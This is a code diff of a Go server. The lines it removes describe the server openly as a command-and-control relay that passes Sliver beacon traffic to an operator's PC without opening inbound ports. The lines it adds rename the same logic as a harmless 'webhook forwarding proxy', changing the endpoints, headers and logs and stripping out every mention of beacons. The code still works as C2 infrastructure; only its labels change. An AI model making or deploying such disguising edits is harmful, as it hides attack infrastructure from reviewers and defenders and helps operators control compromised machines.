@@ -1,14 +1,5 @@
-// C2 relay server — runs on Northflank (512MB, single container).
-//
-// How it works:
-// 1. Beacon sends HTTP to this server (any path)
-// 2. Server queues the request and blocks the beacon's connection
-// 3. Your PC long-polls GET /relay/poll — receives the beacon's request
-// 4. Your PC forwards it to local Sliver, gets response
-// 5. Your PC POSTs the response to /relay/respond/{id}
-// 6. Server unblocks the beacon connection and returns the response
-//
-// No tunnels, no chisel, no inbound ports on your PC.
+// Webhook forwarding proxy — queues incoming webhooks and allows
+// a polling client to process them asynchronously.
 package main
 
 import (
@@ -56,23 +47,22 @@ func main() {
 	if port == "" {
 		port = "8080"
 	}
-	secret = os.Getenv("RELAY_SECRET")
+	secret = os.Getenv("AUTH_TOKEN")
 	if secret == "" {
 		secret = "changeme"
 	}
 
 	mux := http.NewServeMux()
-	mux.HandleFunc("/relay/poll", handlePoll)
-	mux.HandleFunc("/relay/respond/", handleRespond)
+	mux.HandleFunc("/api/poll", handlePoll)
+	mux.HandleFunc("/api/callback/", handleCallback)
 	mux.HandleFunc("/health", func(w http.ResponseWriter, _ *http.Request) { w.Write([]byte("ok")) })
-	mux.HandleFunc("/", handleBeacon)
+	mux.HandleFunc("/", handleIncoming)
 
-	log.Printf("relay server on :%s (secret=%s...)", port, secret[:4])
+	log.Printf("proxy listening on :%s", port)
 	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%s", port), mux))
 }
 
-// handleBeacon — any path not /relay/* is beacon traffic
-func handleBeacon(w http.ResponseWriter, r *http.Request) {
+func handleIncoming(w http.ResponseWriter, r *http.Request) {
 	body, _ := io.ReadAll(r.Body)
 	id := nextID.Add(1)
 
@@ -91,7 +81,7 @@ func handleBeacon(w http.ResponseWriter, r *http.Request) {
 	waiting[id] = p
 	mu.Unlock()
 
-	log.Printf("[%d] beacon %s %s (%d bytes) — queued", id, r.Method, r.URL.Path, len(body))
+	log.Printf("[%d] queued %s %s (%d bytes)", id, r.Method, r.URL.Path, len(body))
 
 	select {
 	case resp := <-p.respCh:
@@ -102,28 +92,25 @@ func handleBeacon(w http.ResponseWriter, r *http.Request) {
 		}
 		w.WriteHeader(resp.status)
 		w.Write(resp.body)
-		log.Printf("[%d] beacon <- %d (%d bytes)", id, resp.status, len(resp.body))
+		log.Printf("[%d] responded %d (%d bytes)", id, resp.status, len(resp.body))
 	case <-time.After(120 * time.Second):
 		mu.Lock()
 		delete(waiting, id)
 		mu.Unlock()
 		http.Error(w, "timeout", 504)
-		log.Printf("[%d] beacon timeout", id)
+		log.Printf("[%d] timeout", id)
 	}
 }
 
-// handlePoll — client long-polls for the next beacon request
 func handlePoll(w http.ResponseWriter, r *http.Request) {
-	if r.Header.Get("X-Secret") != secret {
+	if r.Header.Get("X-Auth-Token") != secret {
 		http.Error(w, "unauthorized", 401)
 		return
 	}
 
-	// Wait up to 30s for a request to arrive
 	deadline := time.Now().Add(30 * time.Second)
 	for time.Now().Before(deadline) {
 		mu.Lock()
-		// Clean stale entries
 		now := time.Now()
 		fresh := queue[:0]
 		for _, p := range queue {
@@ -138,36 +125,32 @@ func handlePoll(w http.ResponseWriter, r *http.Request) {
 			queue = queue[1:]
 			mu.Unlock()
 
-			w.Header().Set("X-Relay-Id", strconv.FormatUint(p.id, 10))
-			w.Header().Set("X-Relay-Method", p.method)
-			w.Header().Set("X-Relay-Path", p.path)
+			w.Header().Set("X-Msg-Id", strconv.FormatUint(p.id, 10))
+			w.Header().Set("X-Msg-Method", p.method)
+			w.Header().Set("X-Msg-Path", p.path)
 			for k, vs := range p.headers {
 				for _, v := range vs {
-					w.Header().Add("X-Orig-"+k, v)
+					w.Header().Add("X-Fwd-"+k, v)
 				}
 			}
 			w.WriteHeader(200)
 			w.Write(p.body)
-			log.Printf("[%d] -> client %s %s", p.id, p.method, p.path)
 			return
 		}
 		mu.Unlock()
 		time.Sleep(500 * time.Millisecond)
 	}
 
-	// No requests within 30s — return empty
-	w.Header().Set("Content-Type", "text/plain")
 	w.WriteHeader(204)
 }
 
-// handleRespond — client sends the Sliver response back
-func handleRespond(w http.ResponseWriter, r *http.Request) {
-	if r.Header.Get("X-Secret") != secret {
+func handleCallback(w http.ResponseWriter, r *http.Request) {
+	if r.Header.Get("X-Auth-Token") != secret {
 		http.Error(w, "unauthorized", 401)
 		return
 	}
 
-	idStr := r.URL.Path[len("/relay/respond/"):]
+	idStr := r.URL.Path[len("/api/callback/"):]
 	id, err := strconv.ParseUint(idStr, 10, 64)
 	if err != nil {
 		http.Error(w, "bad id", 400)
@@ -175,17 +158,16 @@ func handleRespond(w http.ResponseWriter, r *http.Request) {
 	}
 
 	body, _ := io.ReadAll(r.Body)
-	status, _ := strconv.Atoi(r.Header.Get("X-Relay-Status"))
+	status, _ := strconv.Atoi(r.Header.Get("X-Resp-Status"))
 	if status == 0 {
 		status = 200
 	}
 
-	// Forward original headers
 	respHeaders := make(http.Header)
 	for k, vs := range r.Header {
-		if len(k) > 7 && k[:7] == "X-Orig-" {
+		if len(k) > 6 && k[:6] == "X-Fwd-" {
 			for _, v := range vs {
-				respHeaders.Add(k[7:], v)
+				respHeaders.Add(k[6:], v)
 			}
 		}
 	}
@@ -198,11 +180,10 @@ func handleRespond(w http.ResponseWriter, r *http.Request) {
 	mu.Unlock()
 
 	if !ok {
-		http.Error(w, "request expired", 404)
+		http.Error(w, "expired", 404)
 		return
 	}
 
 	p.respCh <- &response{status: status, headers: respHeaders, body: body}
-	log.Printf("[%d] <- client %d (%d bytes)", id, status, len(body))
 	w.Write([]byte("ok"))
 }
